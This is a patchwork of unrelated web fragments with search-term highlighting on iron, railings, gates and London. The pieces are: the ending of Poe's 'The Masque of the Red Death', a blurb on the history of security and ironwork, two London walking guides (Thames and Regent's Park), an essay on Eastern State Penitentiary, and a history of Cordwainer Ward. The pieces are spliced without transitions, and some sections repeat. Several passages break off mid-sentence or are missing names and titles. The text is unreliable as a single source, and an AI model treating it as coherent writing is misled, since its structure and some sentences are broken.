apartment, turned suddenly and confronted his pursuer. There was a sharp cry&#x2014;and the dagger dropped gleaming upon the sable carpet, upon which, instantly afterwards, fell prostrate in death the Prince Prospero. Then, summoning the wild courage of despair, a throng of the revellers at once threw themselves into the black apartment, and, seizing the mummer, whose tall figure stood erect and motionless within the shadow of the ebony clock, gasped in unutterable horror at finding the grave cerements and corpse-like mask, which they handled with so violent a rudeness, untenanted by any tangible form.</p>   <p>And now was acknowledged the presence of the Red Death. He had come like a thief in the night. And one by one dropped the revellers in the blood-bedewed halls of their revel, and died each in the despairing posture of his fall. And the life of the ebony clock went out with that of the last of the gay. And the flames of the tripods expired. And Darkness and Decay and the Red Death held illimitable dominion over all.</p>  </div>

Dating from ancient Egypt to modern times,they were the first line of defense in keeping people secure.As the world became more industrial and militaristic, an increasing number of individuals and businesses began to employ the services of security guards for personal protection.Home security systems date back farther than you might imagine. Though moats and armed guards have been in place to protect homes for centuries, with the invention of electricity, the art of home protection was greatly improved. Before the Middle Ages, wrought <b>iron</b> was used primarily for weapons and tools, however, the medieval period brought with it a multitude of uses for wrought <b>iron</b>. It began to be used to cover doors and windows of buildings to protect against the attacks of raiders. The boom of ironwork in the 18th century led to beautiful <b>railings</b> and <b>gates</b> throughout <b>London</b> and eventually made its way to the United States.Today the craft of manipulating raw steel continues to be an art in the growing demand for quality home security and artistic decoration for your home or business.</p>  </div>

   <div>   <h2><span>Walking in <b>London</b></span></h2>   <h2>Let&#x2019;s Go Walking along the Thames</h2>   <p><strong>Some of the best paths in <b>London</b> can be found along the banks of the river Thames. Whenever you are looking for a particularly easy walk: a two to three hour stroll to help you digest a heavy Sunday lunch or something to do if an afternoon business meeting has been cancelled, my advice: Pick a stretch. Any stretch.</strong></p>   <p>There is only one thing you may want to consider &#x2013; as far as the Thames is concerned, East is East and West is West, and although the twain do eventually meet (somewhere in central <b>London</b>, presumably), they are rather awkward neighbours with irreconcilable temperaments.</p>   <p>The East Thames is melancholy in nature, at times even downright gloomy, full of history but often &#x2013; as you will remember if you have read about &#x2013; involving some of this history&#x2019;s darker aspects: convicts on the way to Australia, orphanages, pirates who are publicly tortured to death.</p>   <p>The West, conversely, is merry and bucolic throughout, and it was therefore fitting that on the two days we had set aside for our Thames walks, the sky was overcast and grey on Day 1 (East) while on Day 2 (West), we walked straight into a Hollywood version of an autumn day, azure skies and intensely coloured leaves as far as the eye could see. Almost everybody we met, walking along the Thames, appeared to have brought their cameras with them.</p>   <p>Our walk begins in the fairly posh <strong><b>London</b></strong> suburb of Kew. Take the train (District Line on the <b>London</b> Underground) to Kew Gardens and, leaving the station through the main exit, turn right at the fork into Kew Gardens Road.</p>   <p>When that street ends, turn right into Kew Road (opposite you, you can see the walls of the famous Botanic Garden) past Newens tea room.

Cross the bridge and continue down your right hand side by the northern bank of the river.</p>   <p>This stretch of the <strong>Thames</strong> is called the Strand on the Green, an old fishermen&#x2019;s village and one of the most picturesque parts of <b>London</b>. The Strand is also home to some of the capital&#x2019;s most popular riverside pubs, such as the Bull&#x2019;s Head.</p>   <p>At the end of this section of the path, continue straight-ish into Grove Park Road, all the way up to the church, then turn left and left again on to the bridge.</p>   <p>Take the stairway half way down the bridge towards Chiswick station and continue by turning left into Park Road until you meet the grounds of <strong>Chiswick House</strong> on your right hand side.</p>   <p>Enter the gate and explore the garden at length &#x2013; perhaps you even find the time for a visit to the house itself, a rare example for an almost completely &#x201c;Italianate&#x201d; English country house (built in 1729).</p>   <p>Exit the park by leaving the Chiswick house gateway on your left and walk past the outdoor cafeteria, also on your left, to the <b>iron</b> <b>gates</b> next to a white lodge.

After a couple of minutes, you will reach St Nicholas church and churchyard where you can find the graves of two more famous painters, Hogarth and Whistler.</p>   <p>Walking out of the churchyard, turn right (into Chiswick Mall) and continue by the Thames. There are some pretty grand mansions on this stretch of the river, and the third or fourth house that you will see &#x2013; called Bedford House &#x2013; used to belong to the famous Redgrave dynasty of actors (Michael, Vanessa, Lynn etc).</p>   <p>Just follow the river from here onwards, all the way past Hammersmith Terrace and Furnivall Gardens to Hammersmith Bridge, perhaps London&#x2019;s prettiest (which may explain why Irish terrorists tried to blow it up not once, not twice, but three times).</p>   <p>Turn left on to the bridge and continue in the direction of St Paul&#x2019;s church behind which you will find Hammersmith Underground station. <strong>Central <b>London</b></strong> is only a few stops away from here.</p>   <p>One last word: for much of this walk, we followed the route suggested by Andrew Duncan in his &#x201c;<strong>Walking <b>London</b></strong>&#x201d;. This is not only the best introduction into the sights and the history of the capital but simply the best guide into &#x201c;<strong>&#x201d;</strong> I have ever come across, and I have come across quite a few.

   <div>   <p>Ours is a grimy bit of blue; And very small; And sunbeams scarce adventure to O&#x2019;ertop the wall. A bird that flutters swiftly by; A wind that passes with a sigh; A cloudlet sailing slow and high; And that is all.</p>   <p><em>O matins, and O vesper bells, Toll slowly!</em> A city of a thousand cells&#x2014; A thousand individual hells.</p>   <p>Incarcerated in the in Philadephia in 1916, Clarence Alexander Rae, a convicted book thief, penned the internal experience of a life interupted. The narrative he traces through his book of poems, , follows the path of subjection, the result of inescapable regimes of surveillance and control. Dedicated to &#x201c;Our Lady with the Lamp,&#x201d; it is one of the earliest tales of captivity to emerge from the modern prison complex, an outcropping of reformist practices that ultimate strove to control the body so as to free the soul for enlightenment.</p>   <p>In his recent book, <em>The Prison and the American Imagination</em>, calls the prison narrative &#x201c;the first distinctly American literary genre.&#x201d; He cites Mary White Rowlandson&#x2019;s 1682 text, <em>The Sovereignty and Goodness of God,</em> as one of the earliest captivity narratives, and perhaps one of the most fascinating. Abducted by what she labels the devilish native peoples and held in slavery while they massacred the settlers of New England, she describes the horrors of being held against one&#x2019;s will. Her six-year-old daughter dies, and Rowlandson&#x2019;s madness drives her to hug the corpse through the night until it is torn from her: &#x201c;I cannot but take notice how at another time I could not bear to be in the room where any dead person was, but now the case is changed; I must and could ly down by my dead Babe, side by side all the night after.&#x201d; Echoing the work of sociologist Loic Wacquant, Smith concludes that &#x201c;the captivity narrative has served to reinforce, perhaps even to create, identities in conflict: white against red, or against black, or against shades of brown.&#x201d; In a strange way, the prison narrative is the most American of all, and the one in which our systems of disenfranchisement and prejudice are erected and enacted.</p>   <p>When a prisoner first arrived at Eastern State after the usual surrender of possessions would, he would be stripped down, his hair shaved close, he&#x2019;d be numbered, then led to his box of solitude with a hood over his face that obscured all light and sensation. In the early years before they instituted hoods with holes for the eyes, he&#x2019;d never leave his cell without all of his senses being enshrouded in darkness. There would be no letters or news from his family on the outside, and only the occasional word from a guard could be heard&#x2014;he was essentially, Smith argues, buried alive and transformed into bare life. The only book that was allowed in the cells was the Bible.</p>   <p>The building itself was the hailed as the perfect system of the time, and its architect, John Haviland, became the prison architect of the 19th century on the backs of this effort. Eastern State accepted its first inmates in 1829, but wasn&#x2019;t completed until 1836. The radial plan allowed the 450 solitary cells (each with a small skylight) to be policed efficiently&#x2014;long rows connected the wings to a central command center. Inmates found themselves in a very small, vaulted cell with a bed that was hung from chains, with a small space for their required work. A small peephole allowed the guards to look in whenever they felt the urge, and food and materials relating to their work was passed through a small slit in the door that remained closed when not in use. The real surprise was the water tap and flush toilet in every cell, at a time when many in the city just a few miles south of the walls did not have such luxuries. </p>   <p>There is something distinctly Poe about all of the tales from the inside of this early supermax; the narratives of these inmates is thoroughly gothic with its medieval iron gates, deep shadows, unnatural solitude, and persistent nagging of emerging psychoses. Perhaps Edgar Allan Poe, residing at the time not too far away from the prison walls, wrote in the shadow of Haviland&#x2019;s much-praised architectural feat. The prison&#x2019;s first board of directors wrote that the architecture would &#x201c;turn the thoughts of the convict inwards upon himself, and to teach him how to think.&#x201d; In effect, the total immersion in solitude would lead the convict to split his criminal mind from his &#x201c;penitent&#x201d; mind, and hence our word In the mind of the Quaker reformers who inspired this new prison philosophy, the inmate would eventually wrestle with this split until they reached a state of passivity and contentment&#x2014;a mythology of resurrection if there ever was one.</p>   <p>While in the 18th century justice was carried out within communities that inspired their own form of punishment (mainly focusing on the Hammurabian eye-for-an-eye style), the turn of that century saw the rise of institutionalized punishment. The Walnut Street Jail was built in 1790 by a bunch of Quakers living in Philadelphia, and was effectively the first prison that was focusing on reforming its inmates. Buildings built for mental and physical torture, these early jails (like New York&#x2019;s Newgate Prison of 1797 and Auburn Prison of 1816) had moved the hangmen outside but kept the interiors similar to those more medieval-styled sites. Inmates would mingle and live in giant pits of rooms, and the overcrowded spaces essentially gave rise to a population better trained in all acts of criminality. Eastern State, in some ways, was seen as a vast improvement on these earlier conditions, and even the eyes of civilized Europe turned toward the building for inspiration. Charles Dickens famously made a visit to Eastern State during a trip through the States, and the master of sympathy found something he didn&#x2019;t expect. He wrote that the inmates were &#x201c;dead to everything but torturing anxieties and horrible despair,&#x201d; and wondered of one prisoner &#x201c;why does he stare at his hands and pick the flesh open&#x2026;and raise his eyes for an instant&#x2026;to those bare walls?&#x201d; </p>   <p>By the end of that century, the Supreme Court was investigating the mental anguish of enduring long-term solitary confinement, which Dickens surmised was &#x201c;immeasurably worse than any torture of the body.&#x201d; A century after total solitary confinement was abandoned at the prison, Eastern State shut its doors in 1971, and has since been allowed to degrade into a glorious ruin that perhaps, poetically, mirrors the degradation that occurred in each prisoner&#x2019;s mental and emotional life. National Geographic&#x2019;s recent special, , featured some inmates being held in solitary in the Colorado State Penitentiary, and many of them stated how they would act out just to get a hit from a guard&#x2019;s club. That one touch&#x2014;no matter how brutal or how much it reasserted the power differential&#x2014;would remind them that they are at the bottom of it all a part of the human community. And when we read the tales from Eastern State, the lore of the old world, it is easy to see a sort of neuroses that we have toward those who are confined&#x2014;the hoods, the vaulted ceilings, the rupturing of all ties to the outside, the obsession with reform and the inability to make that happen. There is more to be said about the Quaker ties, and certainly with the Biblical and resurrectionist undertones of much to do with the early solitary confinement set-ups, but it&#x2019;s worth just drawing it back to today&#x2019;s prisoners, Eastern State&#x2019;s legacy.</p>   <p>Listen to a piece from June 2009 by the , which spoke to some inmates being held in solitary confinement, and some of the family members on the outside. </p>  </div>  
   <div>   <h2><span>Walking in London</span></h2>   <h2>Let&#x2019;s Go Walking along the Thames</h2>   <p><strong>Some of the best paths in London can be found along the banks of the river Thames. Whenever you are looking for a particularly easy walk: a two to three hour stroll to help you digest a heavy Sunday lunch or something to do if an afternoon business meeting has been cancelled, my advice: Pick a stretch. Any stretch.</strong></p>   <p>There is only one thing you may want to consider &#x2013; as far as the Thames is concerned, East is East and West is West, and although the twain do eventually meet (somewhere in central London, presumably), they are rather awkward neighbours with irreconcilable temperaments.</p>   <p>The East Thames is melancholy in nature, at times even downright gloomy, full of history but often &#x2013; as you will remember if you have read about &#x2013; involving some of this history&#x2019;s darker aspects: convicts on the way to Australia, orphanages, pirates who are publicly tortured to death.</p>   <p>The West, conversely, is merry and bucolic throughout, and it was therefore fitting that on the two days we had set aside for our Thames walks, the sky was overcast and grey on Day 1 (East) while on Day 2 (West), we walked straight into a Hollywood version of an autumn day, azure skies and intensely coloured leaves as far as the eye could see. Almost everybody we met, walking along the Thames, appeared to have brought their cameras with them.</p>   <p>Our walk begins in the fairly posh <strong>London</strong> suburb of Kew. Take the train (District Line on the London Underground) to Kew Gardens and, leaving the station through the main exit, turn right at the fork into Kew Gardens Road.</p>   <p>When that street ends, turn right into Kew Road (opposite you, you can see the walls of the famous Botanic Garden) past Newens tea room. I know it is a little early for a break but their &#x201c;Maids of Honour&#x201d; cakes are apparently excellent &#x2013; Henry VIII is said to have been a great fan.</p>   <p>You will then come to the traffic lights where you turn left into Kew Green. &#xa0;Cross the village green with the church on your right hand side &#x2013; you may search out the grave of the painter Thomas Gainsborough who is buried here (it is the one with the black iron railings) &#x2013; towards the bridge on the far side.

   <div>   <p>Security Throughout History </p>   <p>Security has always been used throughout history for protection of ones self ,property and their valuables a large ditch or trench surrounding a castle was first created to protect castles during dangerous times. Dating from ancient Egypt to modern times,they were the first line of defense in keeping people secure.As the world became more industrial and militaristic, an increasing number of individuals and businesses began to employ the services of security guards for personal protection.Home security systems date back farther than you might imagine. Though moats and armed guards have been in place to protect homes for centuries, with the invention of electricity, the art of home protection was greatly improved. Before the Middle Ages, wrought iron was used primarily for weapons and tools, however, the medieval period brought with it a multitude of uses for wrought iron. It began to be used to cover doors and windows of buildings to protect against the attacks of raiders. The boom of ironwork in the 18th century led to beautiful railings and gates throughout London and eventually made its way to the United States.Today the craft of manipulating raw steel continues to be an art in the growing demand for quality home security and artistic decoration for your home or business.</p>  </div>

   <div>   <h1>Regent&#x2019;s Park, <b>London</b> Zoo &amp; Primrose Hill</h1>   <div>    <p><strong>Why this walk ?</strong>&#xa0;&#x2013; Regent&#x2019;s Park is my favourite of the inner <b>London</b> parks and this walk covers most of its 410 acres (166 hectares), along with a visit to Primrose Hill, to get a birds eye view of the capital skyline. &#xa0;There are plenty of opportunities for refreshments along the way and a&#xa0;visit <b>London</b> Zoo is also an option. <strong>Distance</strong>&#xa0;&#x2013; circa 6.5 km or 4 miles. <strong>Map</strong>&#xa0;&#x2013; The <b>London</b> A to Z Map is okay but the on the Royal Parks website is excellent as are the ones at the entrance to every section of the park. &#xa0;My map below is created from openstreetmap.org and I will improve this when I next get a moment. </p>    <p><strong>Refreshments</strong>&#xa0;&#x2013; there are lots of places to stop on the way as detailed below <span><strong>,</strong></span>&#xa0;&#xa0;<span><span><strong>&#xa0;</strong></span><strong>&#xa0;</strong></span><strong><span><span>, </span></span></strong><span>and</span> <strong>Nearest Tube Stations</strong> &#x2013; <strong>Great Portland Street</strong> on the Circle &amp; Metropolitan line and <strong>Regents Park</strong> on the Bakerloo line, both of which deposit you on the South side of the Marylebone Road. &#xa0;From here its a short walk &#x2013; see Walk Directions. &#xa0; Alternatively <strong>Baker Street</strong> tube station on the Bakerloo, Circle and Metropolitan lines, is another alternative, with a different entrance into Regent&#x2019;s Park, found by heading North on Baker Street for 400 metres, until you see the park and then bearing right and crossing the Outer Circle at the Pedestrian crossing, into the park. <strong>Walk Directions</strong>&#xa0;&#x2013; This walk starts at the Regent&#x2019;s Park entrance just where Park Square East Road meets the Outer Circle. <span><strong>From Regent&#x2019;s Park Tube station</strong></span> head East along the Marylebone Road for 200 metres and cross to the North side of the six lane <span>Marylebone Road</span>, via the pedestrian crossing and head North up the left hand side of <span>Park Square East Road</span>&#xa0;for 150 metres and across the traffic island, to reach one of the main entrances into the park, at the inter-section with the <span>Outer Circle</span> road. <span><strong>From Great Portland Street Tube station</strong><span>, turn left (West for 20 metres) to a pedestrian crossing. &#xa0;From here</span></span><span>&#xa0;</span>head to the North side of the<span> Marylebone Road</span>, across the 6 lanes of traffic and then left again, heading West for 200 metres on the North side of the <span>Marylebone Road</span>. &#xa0;You will go across Albany Street and past some fancy black metal <b>railings</b> and then some large black <b>gates</b> controlling traffic into the park. &#xa0;The wide road heading North with a private park on its left hand side is <span>Park Square East Road</span>. &#xa0;Head up the left hand side of <span>Park Square East Road</span> for 150 metres and across the traffic island, to reach one of the main entrances into the park, at the inter-section with the <span>Outer Circle</span> road.</p>    <p>1) On entering the park you will see a noticeboard on your left, with a large colourful map of Regent&#x2019;s Park, which is very useful for orientating yourself.</p>    <p>2) Take the left fork for 50 metres, ignoring the first right turning until reaching the first water fountain, which is like a small roundabout. &#xa0;Turn right heading North into an avenue of lovely trees and bushes, part of &#xa0;Avenue Gardens.</p>    <div>     <p>Avenue Gardens looking North</p>    </div>    <div>     <p>Formal Flower beds in Avenue Gardens</p>    </div>    <p>3) After 100 metres at the next water fountain, bear slightly left, but still heading North. &#xa0;You will pass some pretty flower beds on your right as you head up to the next fountain (100 metres). &#xa0;Keep heading North to the next fountain (100 metres) and bear left and slightly left again to bring you out to a wide path. Turn right heading North on the main path and through the park gate and cross <span>Chester Road</span> at the pedestrian Crossing and enter the Park again.</p>    <div>     <p>View from the Pedestrian Crossing of the Regency Buildings around Regent&#x2019;s Park</p>    </div>    <p>4) On entering the Park the is on your left as are toilets. &#xa0;Keep heading North on a wide tree lined avenue, for 500 metres to reach a fountain in the middle of the path. &#xa0;This fountain was a gift from Sir Cowasjee Jehangir, a wealthy parsee gentleman of Bombay as a token of his gratitude, to the people of England for protection offered to him by fellow countryman under the British rule of India in 1869.</p>    <div>     <p>The Fountain</p>    </div>    <div>     <p>Plaque showing the fountain was a gift from Sir Cowasjee Jehangir</p>    </div>    <p>5) At the fountain turn the equivalent of left, heading over some grass downhill slightly for 50 metres. Then bear right and keep right at the next junction. &#xa0;Keep on this wide path for 600 metres &#xa0;running parallel with <b>London</b> Zoo on your right, until you reach an park exit gate. &#xa0;You&#x2019;ll go past the camels enclosure and children&#x2019;s zoo. &#xa0;On your left is a raised building that looks like a UFO, which is a sports facility and cafe with great views called <span> &#x2013; &#xa0;</span><span><span>see the Royal parks website for more details,</span></span><span>&#xa0;</span>   <div>     <p>The Hub viewed from the path by <b>London</b> Zoo</p>    </div>    <p>6) On exiting the gate, cross the <span>Outer Circle</span> road and head north down a passage with a No Cycling sign on its left. &#xa0;(N.B. &#xa0;if you want to visit the <strong>Zoo</strong> on exiting the gate, do not cross the <span>Outer Circle</span> road, merely turn right and keep heading up the pavement for 400 metres and the main Zoo entrance is then on your right).</p>    <p>7) You will see a running track on your left and will then go over <span>Primrose Hill Bridge</span> which crosses the <strong>Regent&#x2019;s Canal</strong>. &#xa0;You&#x2019;ll go past another Park map on your left and then fork right and cross <span>Prince Albert Road</span> at the pedestrian crossing.</p>    <p>8) Turn right and head into Primrose Hill Park, taking the second path on the right, heading slightly uphill. &#xa0;Go straight across two cross roads and after 300 metres turn left at the next junction, by a dog bin, heading steeply up <strong>Primrose Hill</strong> for 300 metres. &#xa0;You will reach an oval shaped viewing platform and are now 62.8metres or 206 feet above sea-level. &#xa0;From here you get great views across the <b>London</b> skyline, with St Pauls Cathedral, The Shard, Canary Wharf, <b>London</b> Eye, BT Tower and the city all visible on a clear day. &#xa0;You&#x2019;ll see the following carved in the stone in front of you &#x201c;I have conversed with the spirital sun &#x2013; I saw him on Primrose Hill&#x201d; by William Blake &#xa0;1757 &#x2013; 1827.</p>    <div>     <p>Typical Primrose Hill houses surrounding the park</p>    </div>    <div>     <p>View from Primrose Hill</p>    </div>    <p>9) Continue through the viewing platform and take the left fork of the path heading downhill. &#xa0;Keep on this path for 600 metres to exit the park via the gate you entered.</p>    <p>10) Re-trace your route over the <span>Prince Albert Road</span>&#xa0;pedestrian crossing, turning right and then immediately left to go back over <span>Primrose Hill Bridge</span>, to the<span> Outer Circle&#xa0;</span> and crossing this again back into Regent&#x2019;s Park.</p>    <p>11) On entering the park take the furthest path on your right. &#xa0;Keep on the tarmac path. &#xa0;On your left you will see three wooden sculptures by Tom Harvey done in 2009. &#xa0;The first is a girl crouching next to a big cat. &#xa0;The second is a girl staring at a wolf and the third is a standing girl and carved stools.

   <div>   <p>Although they do not have so much of a physical presence today, the Wards of the City of <b>London</b> are centuries old partitions of the City into individual areas with their own administrative, financial and governance functions. The history of the Wards goes back to Medieval times with their origins&#xa0;almost certainly&#xa0;being earlier. They were probably&#xa0;the ancient estates within the City of someone in a role similar to a lord of the manor and had some level of civil and criminal jurisdiction over the Ward.</p>   <p>Documents written in the&#xa0;12th Century refer to the Ward system and to the names of Alderman of the Wards who held a largely hereditary position with the role of Alderman becoming an elected role during the reign of Edward III (1327 &#x2013; 1377), by which time the Wards appear to have assumed&#xa0;names similar to those of today.</p>   <p>In walking and exploring&#xa0;the City of <b>London</b>, I find&#xa0;it is the Streets, Churches and Wards that provide tangible contact with London&#x2019;s long history.</p>   <p>One such ward is Cordwainers&#xa0;Ward, just to the east of St. Paul&#x2019;s Cathedral and to the south of Cheapside. The following map from 1755 shows Cordwainer&#xa0;Ward, south of Cheapside with boundary wards shown along the edge. Breadstreet Ward is not marked, but is to the left, the boundary being&#xa0;the street of the same name.</p>   <p>Cordwainer&#xa0;Ward is one of the few examples of where wards have been named after the trade practiced by the inhabitants. The name is derived from the early English word &#x201c;cordwaner&#x201d; meaning a worker in &#x201c;cordwane&#x201d; which was leather from the town of Cordova in Spain and the name dates back to around the 12th / 13th Century.</p>   <p>Shoe manufacture and sale&#xa0;was one of the key trades within the ward and in Henry 2nd&#x2019;s reign (1154 to 1189) the sale of shoes was only allowed in the shoe market in Cheap between Cordwainer Street and Soper Lane (now Bow Lane and Queen Street).</p>   <p>Cordwainers&#xa0;were among the first of the craft organisations having received ordinances from the Mayor of <b>London</b> in 1271. Despite holding a prominent position in the early trades of <b>London</b>, in 1303 the Cordwainers&#xa0;were the subject of public complaints of fraud, in that they were using inferior leathers mixed in with the superior Cordova leather.&#xa0; There was also an ongoing&#xa0;rivalry with the Cobblers, and the Cordwainers were forbidden to mend shoes and the Cobblers forbidden to make them.</p>   <p>The craft is now commemorated&#xa0;by a Cordwainer&#xa0;statue erected in 2002 by the Ward of Cordwainer&#xa0;Club, which can be found in Watling&#xa0;Street, and is a good place to start a walk exploring Cordwainer Ward.</p>   <p>The plaque reads <em>&#x201d; You are in the Ward of Cordwainer&#xa0;which in medieval times was the centre of shoe making in the City of <b>London</b>. The finest leather from Cordoba in Spain was used and gave rise to the name of the craftsmen and the Ward. The Cordwainer&#xa0;statue was erected in 2002 to celebrate the century of the Ward of Cordwainer Club.&#x201d;</em></p>   <p>Records of the names of the Aldermen of Cordwainer Ward go back to circa 1115 and appear to be continuous to the present day. The trades of each Alderman demonstrate the range of activities carried out in the Ward over the centuries, for example:</p>   <p>1313 Simon Corp, Pepperer</p>   <p>1375 John de Northampton, Draper</p>   <p>1599 William Craven, Merchant Taylor</p>   <p>1687 John Gardner, Skinner</p>   <p>1774 George Hayley, Armourer</p>   <p>1784 Brook Watson, Musician</p>   <p>1875 George Swan Nottage, Spectacle Maker</p>   <p>Opposite the Cordwainer&#xa0;statue in Watling&#xa0;Street&#xa0;is the site of the headquarters of the&#xa0;<b>London</b> Salvage Corps. Formed in 1865, the <b>London</b> Salvage Corps was effectively a private service operated by the <b>London</b> insurance companies. Their primary task was salvage both during and after a fire. During a fire, the Core would try to protect and recover goods and property and after a fire the Corps was responsible for the salvaged goods and property if insured, or until the insurance position could be ascertained.</p>   <p>The <b>London</b> Salvage Core operated until 1982.&#xa0;The change in building usage in the City from warehousing to offices meant that&#xa0;the risk of fire was reduced and there were no longer goods to be salvaged.</p>   <p>Watling&#xa0;Street is considered to be one of the oldest streets in the city and originally a Roman road running from Dover through to Chester. Watling&#xa0;Street outside of <b>London</b> can easily be traced on Ordnance Survey maps, or by driving the route. Long straight roads passing through Dunstable, Towcester, to the east of Rugby, between Nuneaton and Hinckley clearly demonstrate the Roman origins of this street.</p>   <p>On approaching central <b>London</b>, the original Watling&#xa0;Street passed down Edgware&#xa0;Road to the area where Marble Arch is currently located where it split into two. One branch headed to Thorney&#xa0;Island (Westminster) whilst the other branch ran along Oxford Street and Holborn, crossing the Fleet and then entering the City by the New Gate. It met up with the current City Watling Street just south of Bow Lane. The part leading up to St. Paul&#x2019;s is a relocation of the original route following a fire in 1136 after which a market had sprung up on the course of the old road.</p>   <p>Looking up Watling&#xa0;Street towards St. Paul&#x2019;s Cathedral (Cordwainer&#xa0;Ward ends and Breadstreet Ward starts roughly where the red van is located):</p>   <p>Running across Watling Street is Bow Lane, here leading up to the church of St. Mary-le-Bow and Cheapside.</p>   <p>Bow Lane is a good example of how street names have changed over the centuries.</p>   <p>The name Bow Lane came from the church, but was not used until the middle of the sixteenth century. Prior to being&#xa0;named Bow Lane, the lower part was called&#xa0;Cordwainer&#xa0;Street with the upper part approaching Cheapside named Hosier&#xa0;Lane due to the hosiers who lived in the lane.</p>   <p>The section of Bow Lane that originally extended south of Cannon Street,&#xa0;is now Garlick Hill.</p>   <p>The following photo shows the church of St. Mary-le-Bow. I explored the church in a post which can be found which included my father&#x2019;s photos showing the devastation in the area following the last war.</p>   <p>William Maitland writing in 1756 records Wren&#x2019;s observations on the discovery of a Roman Causeway during the rebuilding of St. Mary-le-Bow:</p>   <p>&#x201c;<em>The church stood about 40 feet backwards from the high street, and by purchasing the ground of one private house not yet rebuilt he was enabled to bring the steeple forward so as to range with the street houses in Cheapside.&#xa0;Here, to his surprise, he sunk about 18 feet deep through much ground and then imagined he was come to the natural soil, and hard gravel but upon full examination, it appeared to be a Roman causeway of&#xa0;rough stone, close and well rammed, with Roman brick and rubbish at the bottom, for a foundation and all firmly cemented. This causeway was four feet thick. Underneath this causeway lay the natural clay over which that part of the city&#xa0;stands, and which descends at least 40 feet lower. He concluded then to lay the foundation of the Tower upon the very Roman Causeway, as most proper to bear what he had designed, a weighty and lofty structure.&#x201d;&#xa0;</em></p>   <p>This account really brings home that everything we see in <b>London</b> today is built on centuries of earlier construction, and it is fascinating to stand in Cheapside, look at the tower of St. Mary-le-Bow and if Wren&#xa0;was right there is a Roman causeway below, supporting the weight of the tower.</p>   <p>As well as St. Mary-le-Bow there were a number of other churches in Cordwainer&#xa0;Ward.</p>   <p>Walk back down Watling&#xa0;Street, turn left up Queen Street then across to Pancras&#xa0;Lane.

 of <b>London</b> there were two churches in this short lane which gives an indication of the population densities in the area (in March 1587, Cordwainer Ward contributed 301&#xa0;fully armed and equipped men following the request of Queen Elizabeth 1st for soldiers from the City during one of the many invasion scares during the Tudor period. The full table of all City Ward contributions is in my post on ). William Maitland states that in 1631 there were 2238 persons living in the Ward.</p>   <p>Walk down Pancras&#xa0;Lane and we come to the&#xa0;site of St. Pancras Church. This was one of the churches destroyed in the Great Fire that was never rebuilt although the graveyard continued to be used until 1853. The land was left derelict for many years, but was recently purchased by the City of <b>London</b> and transformed into a small garden.</p>   <p>As part of the transformation, a competition was held and the winning design included the installation of a range of beautifully carved benches with their designs based on the Romanesque architecture of the church rising afresh from the ground after the Great Fire.</p>   <p>The benches were carved by students from the City &amp; Guilds of <b>London</b> Art School.</p>   <p>The background to the design of the garden and the carved benches can be found on the website of .</p>   <p>Writing in 1910, Walter Besant states that the graveyard of St. Pancras <em>&#x201c;bears a great similarity to all that is left of the others; it is covered with dingy gravel and decorated by blackened evergreens. the <b>iron</b> gate bears a little shield telling that it was erected in 1886. There are one or two tombs still left.&#x201d;</em></p>   <p>Continue the short distance down Pancras&#xa0;Lane to where it turns right into Sise&#xa0;lane and this is the location of another&#xa0;church lost in the Great Fire, the church of St. Benet Sherehog. &#xa0;There are two plaques recording the church. On the left of the <b>gates</b>, just above the silver bollard is a reproduction of the original stone slab that reads: <em>&#x201c;Before the dreadful Fire, Anno 1666, stood the church of St. Benet Sherehog&#x201d; </em>The blue plaque on the right of the <b>gates</b> records the church on one of the standard city plaques.</p>   <p>There are&#xa0;a couple of possible sources for the name St. Benet Sherehog. The church was originally dedicated to St. Osyth, however it was repaired by one Benedict Shorne, or Sherehog&#xa0;in the reign of Edward II and as a result of the repair the benefactor gave his name to the church. An alternative source is from the hogs that may have wallowed on the shores of the Wallbrook, or the ditches that ran into the stream.</p>   <p>The most frequent reference is to Benedict Shorne, but as with many of the street and church names in the city, the real source of the name is hidden in the centuries that have passed. It is an old name, appearing as early as the twelfth century.</p>   <p>Again writing in 1910, Walter Besant states there remains <em>&#x201c;the railing and low wall were put up in 1842. Within the enclosure stands a tomb over the Family Vault of Michael Davison, 1676&#x201d;.&#xa0;&#xa0;</em>At the time of his death, Michael Davison left a charitable gift to provide &#xa3;5 per annum for keeping his family vault in repair.</p>   <p>The Museum of <b>London</b> excavated the graveyard of&#xa0;St. Benet Sherehog&#xa0;between 1994 and 1996 as part of the No. 1 Poultry development. There were 274 burials excavated and following analysis of 270 of these, 39 were identified as being from the Medieval period.</p>   <p>At the end of Pancras&#xa0;Lane, the street bends to the right to all that remains of Sise Lane.</p>   <p>Sise Lane is a corruption of St.&#xa0;Osyth, a&#xa0;Mercian Queen reputedly&#xa0;martyred around&#xa0;the year 700.</p>   <p>From the end of Sise&#xa0;Lane we can walk south along Queen Victoria Street. We cut across Queen Street which runs down towards Southwark Bridge and north to Cheapside. Queen Street is another that has changed name. Originally known as Soper Lane, or Soapers&#xa0;Lane from the soapmakers&#xa0;who lived in this area. The name was changed to Queen Street soon after the Fire of <b>London</b> in honour of the wife of&#xa0;King Charles II, Queen Catherine of Braganza.</p>   <p>Queen Street&#xa0;/ Soper Lane appears to have a history for markets. In 1297 there was an evening market here called the &#x201c;New Fair&#x201d;, set-up without the approval of the mayor by &#x201c;strangers, foreigners and beggares&#x201d; and was the scene of much &#x201c;strife and violence&#x201d;. It was soon shut down. It was later the market place for the Pepperers, then the Curriers&#xa0;and Cordwainers and in the reign of Queen Mary it was a street known for shops selling pies.</p>   <p>Not much of that in Queen Street today:</p>   <p>Continuing down Queen Victoria Street we come to the church of St. Mary Aldermary. An old church with written references back to the thirteenth century, but probably older. The church was repaired after the Great Fire and considerably restored in 1877 when the nearby church of St. Antholin was closed as one of the many 19th century city church closures. The funds generated by the sale of the site were used to restore St. Mary.</p>   <p>Wren&#x2019;s restoration after the Great Fire was unusual in that it was not based on a new design. The funds for restoration came from one Henry Rogers who left a legacy of &#xa3;5,000 for the restoration of the church. His widow required that the restoration should be an exact copy of the original Gothic style of church. St. Mary Aldermary and St. Alban, Wood Street are the only known examples of Wren&#x2019;s restoration based on the original church.</p>   <p>Opposite St. Mary Aldermary&#xa0;is the junction of Cannon Street and Queen Victoria Street. These two streets have had a significant impact on Cordwainer Ward.</p>   <p>Construction of Queen Victoria Street commenced in 1867 to provide a direct route from the Embankment through to Mansion House. Cannon Street was extended through Cordwainer Ward in 1853-4 to reach St. Paul&#x2019;s Cathedral. The following two maps provide a very clear view of the impact of these two streets. Firstly the 1755 map of the ward:</p>   <p>Now the Ward in the early part of the 20th Century showing the impact of Cannon Street and Queen Victoria Street:</p>   <p>The development of these two streets had a considerable impact on Cordwainer Ward, sweeping away a number of original streets and carving into two, many streets that had originally run down to Thames Street. It is this layout of the Ward that we 